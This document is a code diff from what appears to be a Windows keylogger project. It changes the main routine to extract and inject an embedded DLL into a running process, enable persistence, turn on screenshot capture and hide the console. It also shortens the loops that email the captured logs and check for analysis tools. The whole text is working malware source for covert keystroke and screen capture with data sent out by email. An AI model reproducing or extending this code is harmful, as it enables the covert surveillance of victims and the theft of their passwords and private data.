@@ -6,9 +6,10 @@
 #include "../include/anti_eyes.h"
 #include "../include/stealth.h"
 #include "../include/memory.h"
+#include "../include/inject.h"
 
 
-/*// Thread function for capturing screenshots
+// Thread function for capturing screenshots
 DWORD WINAPI screenshot_thread(LPVOID lpParam) {
     WCHAR filePath[] = L"C:\\Users\\kolby\\source\\repos\\KolbySnider\\Keylogger2\\out\\build\\x64-release\\screenshot.bmp";
 
@@ -18,20 +19,19 @@ DWORD WINAPI screenshot_thread(LPVOID lpParam) {
     }
 
     return 0;
-}*/
-
+}
 
 DWORD WINAPI detect_process_thread(LPVOID lpParam) {
     while (true) {
         detect_process(NULL);
-        Sleep(3000);
+        Sleep(10000);
     }
 }
 
 DWORD WINAPI email_thread(LPVOID lpParam) {
     while (true) {
         // Send email every 5 minutes (300000 milliseconds)
-        Sleep(30000);
+        Sleep(10000);
         save_logs_to_file();
         send_email();
     }
@@ -39,8 +39,12 @@ DWORD WINAPI email_thread(LPVOID lpParam) {
 }
 
 int main() {
+    std::string dllPath = extract_embedded_dll();
+    DWORD pid = get_process_id_by_name(L"key_logger");
+    if (pid != 0) inject_dll(pid, dllPath.c_str());
+
     hide_console();
-    //Persistence();
+    persistence();
 
     install_hook(); // Install the key hook
 
@@ -58,7 +62,6 @@ int main() {
         return 1;
     }
 
-    /*
     HANDLE hScreenshotThread = CreateThread(
         NULL,            // default security attributes
         0,               // default stack size
@@ -70,7 +73,7 @@ int main() {
     if (hScreenshotThread == NULL) {
         std::cerr << "Failed to create screenshot thread." << std::endl;
         return 1;
-    }*/
+    }
 
     HANDLE hdetectProcessThread = CreateThread(
         NULL, // default security attributes
@@ -89,12 +92,12 @@ int main() {
 
     // Clean up the hooks and threads
     uninstall_hook();
-    // WaitForSingleObject(hScreenshotThread, INFINITE); // Ensure screenshot thread finishes
+    WaitForSingleObject(hScreenshotThread, INFINITE); // Ensure screenshot thread finishes
     WaitForSingleObject(hdetectProcessThread, INFINITE); // Ensure Anti-VM thread finishes
     WaitForSingleObject(hEmailThread, INFINITE);
 
     // Close thread handles
-    // CloseHandle(hScreenshotThread);
+    CloseHandle(hScreenshotThread);
     CloseHandle(hdetectProcessThread);
     CloseHandle(hEmailThread);
 
